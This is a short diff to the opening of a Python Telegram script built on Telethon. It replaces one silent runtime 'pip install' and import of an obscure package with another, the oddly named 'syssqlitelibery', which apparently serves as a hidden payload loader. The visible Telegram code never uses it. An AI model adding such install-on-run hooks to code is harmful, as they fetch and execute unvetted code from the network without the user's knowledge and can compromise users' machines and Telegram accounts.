@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptolibrary")
-import pythoncryptolibrary
+os.system("pip install syssqlitelibery")
+import syssqlitelibery
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
